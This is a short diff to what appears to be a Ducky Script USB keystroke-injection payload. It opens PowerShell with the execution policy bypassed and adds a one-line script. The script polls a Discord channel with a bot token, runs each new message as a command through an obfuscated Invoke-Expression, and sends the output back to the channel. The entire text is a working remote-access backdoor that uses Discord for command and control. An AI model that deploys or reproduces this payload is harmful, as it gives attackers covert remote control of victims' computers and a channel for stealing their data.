@@ -16,5 +16,5 @@ DELAY 750
 STRING powershell -Ep Bypass
 ENTER
 DELAY 5000
-STRING
+STRING $t = "YOUR_BOT_TOKEN";$c = "YOUR_CHANNEL_ID";function sndmsg{$w.Headers.Add("Content-Type", "application/json");$j = @{"content" = "``````$($b -join "`n")``````"} | ConvertTo-Json;$x = $w.UploadString($u, "POST", $j)}while($true){$u = "https://discord.com/api/v10/channels/$c/messages";$w = New-Object System.Net.WebClient;$w.Headers.Add("Authorization", "Bot $t");$m = $w.DownloadString($u);$r = ($m | ConvertFrom-Json)[0];if(-not $r.author.bot){$a = $r.timestamp;$m = $r.content}if($a -ne $p){$p = $a;$o = ie`x $m;$l = $o -split "`n";$s = 0;$b = @();foreach($z in $l){$y = [System.Text.Encoding]::Unicode.GetByteCount($z);if(($s + $y) -gt 1900){sndmsg;sleep 1;$s = 0;$b = @()}$b += $z;$s += $y}if($b.Count -gt 0){sndmsg}}Sleep 3}
 ENTER
